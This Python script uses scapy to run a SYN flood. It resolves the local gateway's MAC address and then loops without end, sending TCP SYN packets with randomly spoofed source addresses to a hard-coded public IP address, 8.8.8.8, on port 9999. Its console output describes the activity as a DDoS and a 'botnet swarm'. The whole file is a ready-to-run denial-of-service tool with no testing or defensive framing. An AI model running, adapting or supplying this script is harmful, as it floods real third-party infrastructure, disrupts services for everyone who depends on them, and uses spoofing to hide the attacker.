import warnings
warnings.filterwarnings("ignore", module="cryptography")

import platform
import subprocess
from scapy.all import sendp, IP, TCP, Ether, conf, getmacbyip, RandIP, RandShort, IFACES
import random

# ── Use the OS routing table — deterministic, no IFACES dict ordering issues ──
def get_best_iface():
    try:
        iface_name, _, _ = conf.route.route("8.8.8.8")
        return iface_name
    except Exception:
        for guid, iface in IFACES.items():
            ip = getattr(iface, 'ip', '') or ''
            if ip and ip != '127.0.0.1' and not ip.startswith('169.254.'):
                return guid
        return conf.iface

def get_gateway_mac(ip):
    if platform.system() == "Windows":
        return getmacbyip(ip)
    else:
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines():
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip:
                        mac = parts[3]
                        if mac != "00:00:00:00:00:00":
                            return mac
        except Exception:
            pass
        return None

my_iface = get_best_iface()
iface_desc = getattr(IFACES.get(my_iface, None), 'description', str(my_iface))
print(f"[*] Binding to interface: {iface_desc}")

gateway_ip = conf.route.route("0.0.0.0")[2]
gateway_mac = get_gateway_mac(gateway_ip)

if not gateway_mac:
    print(f"[!] Could not resolve MAC for gateway {gateway_ip}. Exiting.")
    exit(1)

print(f"[*] Gateway: {gateway_ip} -> MAC: {gateway_mac}")

TARGET_IP = "8.8.8.8"
TARGET_PORT = 9999

print(f"[*] Starting Distributed SYN Flood (DDoS) on {TARGET_IP}:{TARGET_PORT}...")
print("[*] Generating random spoofed IP addresses for every packet...")
print(f"[*] Firing botnet swarm out of interface: {iface_desc}")
print("[*] Press Ctrl+C to stop.")

try:
    while True:
        # *** Rebuild packet each iteration so RandIP() and RandShort()
        # produce a fresh value — pre-built packets reuse the same value ***
        for _ in range(30):
            fake_src = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            pkt = (Ether(dst=gateway_mac)
                   / IP(src=fake_src, dst=TARGET_IP)
                   / TCP(sport=random.randint(1024, 65535), dport=TARGET_PORT, flags="S"))
            sendp(pkt, iface=my_iface, verbose=False)
except KeyboardInterrupt:
    print("\n[*] DDoS Attack stopped.")